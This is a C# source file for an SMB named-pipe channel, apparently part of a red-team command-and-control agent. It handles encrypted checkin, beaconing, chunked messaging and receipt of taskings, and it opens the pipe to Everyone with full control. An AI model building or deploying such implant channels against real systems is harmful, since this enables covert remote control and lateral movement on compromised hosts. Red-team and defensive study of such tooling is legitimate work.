using Workflow.Contracts;
using Workflow.Utilities;
using System.Text.Json;
using Workflow.Models;
using Workflow.Channels.Smb;
using System.Collections.Concurrent;
using System.Text;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Workflow.Channels
{
    public class SmbProfile : IChannel, IAsyncDisposable
    {
        private IServiceConfig agentConfig { get; set; }
        private ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private int chunkSize;
        private int connectionTimeoutMs;
        private int checkinTimeoutMs;
        private ConcurrentDictionary<string, StringBuilder> partialMessages =
            new ConcurrentDictionary<string, StringBuilder>();
        private ConcurrentDictionary<string, int> expectedSequence =
            new ConcurrentDictionary<string, int>();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private ManualResetEventSlim checkinAvailable =
            new ManualResetEventSlim(false);
        private ManualResetEventSlim clientConnected =
            new ManualResetEventSlim(false);
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
        private CheckinResponse cir;

        private bool checkedin = false;
        private volatile bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private readonly object disconnectLock = new object();
        private bool disposed = false;
        private CancellationTokenSource cancellationTokenSource { get; set; } =
            new CancellationTokenSource();

        public SmbProfile(
            IServiceConfig config,
            ISecurityProvider crypto,
            ILogger logger,
            IDataBroker messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                SmbChannelOptionsJsonContext.Default.SmbChannelOptions);

            this.pipeName = opts.PipeName;
            this.chunkSize = opts.ChunkSize;
            this.connectionTimeoutMs =
                opts.ConnectionTimeoutSeconds * 1000;
            this.checkinTimeoutMs =
                opts.CheckinTimeoutSeconds * 1000;
            DebugLog.Log($"SMB pipe name: {this.pipeName}");

            this.serverPipe =
                new PipeServer<SmbMessage>(this.pipeName);
            if (OperatingSystem.IsWindows())
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(
                    new PipeAccessRule(
                        new SecurityIdentifier(
                            WellKnownSidType.WorldSid, null),
                        PipeAccessRights.FullControl,
                        AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected +=
                async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected +=
                async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived +=
                async (sender, args) => await OnMessageReceive(args);
            this.serverPipe.StartAsync(
                this.cancellationTokenSource.Token);
            DebugLog.Log("SMB server pipe started");
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            DebugLog.Log("SMB sending checkin");
            await this.Send(
                JsonSerializer.Serialize(
                    checkin, CheckinJsonContext.Default.Checkin));

            DebugLog.Log("SMB waiting for checkin response");
            if (!checkinAvailable.Wait(this.checkinTimeoutMs))
            {
                DebugLog.Log("SMB checkin timed out");
                throw new TimeoutException(
                    $"SMB checkin timed out after " +
                    $"{this.checkinTimeoutMs}ms");
            }

            this.checkedin = true;
            DebugLog.Log("SMB checkin complete");
            return this.cir;
        }

        public async Task StartBeacon()
        {
            var oldCts = this.cancellationTokenSource;
            this.cancellationTokenSource = new CancellationTokenSource();
            oldCts.Dispose();

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await Task.Delay(
                            500, cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    DebugLog.Log("SMB beacon sending responses");
                    await this.Send(
                        messageManager.GetAgentResponseString());
                    this.currentAttempt = 0;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    DebugLog.Log(
                        $"SMB beacon send failed: {e.Message}, " +
                        $"attempt {this.currentAttempt}/{this.maxAttempts}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    DebugLog.Log(
                        "SMB beacon max attempts reached, cancelling");
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        internal async Task<string> Send(string json)
        {
            if (!connected)
            {
                DebugLog.Log("SMB Send waiting for client connection");
                if (!clientConnected.Wait(this.connectionTimeoutMs))
                {
                    throw new TimeoutException(
                        $"SMB connection timed out after " +
                        $"{this.connectionTimeoutMs}ms");
                }
            }

            DebugLog.Log(
                $"SMB Send ({json.Length} chars before encryption)");
            json = this.crypt.Encrypt(json);
            List<string> parts =
                json.SplitByLength(this.chunkSize).ToList();
            DebugLog.Log($"SMB Send chunking into {parts.Count} parts");

            string messageGuid = Guid.NewGuid().ToString();
            for (int i = 0; i < parts.Count; i++)
            {
                SmbMessage sm = new SmbMessage()
                {
                    guid = messageGuid,
                    final = (i == parts.Count - 1),
                    message_type = SmbMessageType.Chunked,
                    agent_guid = agentConfig.uuid,
                    delegate_message = parts[i],
                    sequence = i,
                };
                await this.serverPipe.WriteAsync(sm);
            }

            return String.Empty;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendSuccess()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = SmbMessageType.Success,
                final = true,
                delegate_message = String.Empty,
                agent_guid = agentConfig.uuid,
                sequence = 0,
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                DebugLog.Log(
                    $"SMB message received, type: " +
                    $"{args.Message.message_type}");
                if (args.Message.message_type == SmbMessageType.Success)
                {
                    return;
                }

                string guid = args.Message.guid;

                lock (disconnectLock)
                {
                    this.partialMessages.TryAdd(
                        guid, new StringBuilder());
                    int expected =
                        this.expectedSequence.GetOrAdd(guid, 0);

                    if (args.Message.sequence != expected)
                    {
                        DebugLog.Log(
                            $"SMB chunk out of order for {guid}: " +
                            $"expected {expected}, " +
                            $"got {args.Message.sequence}. " +
                            $"Discarding message.");
                        this.partialMessages.TryRemove(guid, out _);
                        this.expectedSequence.TryRemove(guid, out _);
                        return;
                    }

                    this.expectedSequence[guid] = expected + 1;
                    this.partialMessages[guid].Append(
                        args.Message.delegate_message);
                }

                DebugLog.Log(
                    $"SMB partial message tracked for {guid}, " +
                    $"seq: {args.Message.sequence}, " +
                    $"final: {args.Message.final}");

                if (args.Message.final)
                {
                    DebugLog.Log("SMB message complete, processing");
                    string fullMessage;
                    lock (disconnectLock)
                    {
                        if (!this.partialMessages.TryRemove(
                                guid, out var sb))
                        {
                            DebugLog.Log(
                                $"SMB message {guid} was cleared " +
                                $"during disconnect");
                            return;
                        }
                        this.expectedSequence.TryRemove(guid, out _);
                        fullMessage = sb.ToString();
                    }
                    await this.OnMessageReceiveComplete(fullMessage);
                }

                await this.SendSuccess();
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"SMB OnMessageReceive error: {e.Message}");
            }
        }

        private async Task OnClientConnection()
        {
            DebugLog.Log("SMB client connected");
            this.connected = true;
            clientConnected.Set();
            await this.SendUpdate();
        }

        private async Task OnClientDisconnect()
        {
            DebugLog.Log("SMB client disconnected");
            this.connected = false;
            clientConnected.Reset();
            lock (disconnectLock)
            {
                this.partialMessages.Clear();
                this.expectedSequence.Clear();
            }
        }

        private async Task OnMessageReceiveComplete(string message)
        {
            if (!checkedin)
            {
                cir = JsonSerializer.Deserialize(
                    this.crypt.Decrypt(message),
                    CheckinResponseJsonContext.Default.CheckinResponse);
                checkinAvailable.Set();
                return;
            }

            GetTaskingResponse gtr = JsonSerializer.Deserialize(
                this.crypt.Decrypt(message),
                GetTaskingResponseJsonContext.Default
                    .GetTaskingResponse);
            if (gtr == null)
            {
                return;
            }
            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
            SetTaskingReceived?.Invoke(this, tra);
        }

        private async Task SendUpdate()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                final = true,
                message_type = SmbMessageType.Success,
                delegate_message = "",
                agent_guid = this.agentConfig.uuid,
                sequence = 0,
            };

            await this.serverPipe.WriteAsync(sm);
        }

        public async ValueTask DisposeAsync()
        {
            if (disposed) return;
            disposed = true;

            cancellationTokenSource.Cancel();
            cancellationTokenSource.Dispose();
            checkinAvailable.Dispose();
            clientConnected.Dispose();
            if (serverPipe != null)
            {
                await serverPipe.DisposeAsync();
            }
        }
    }
}
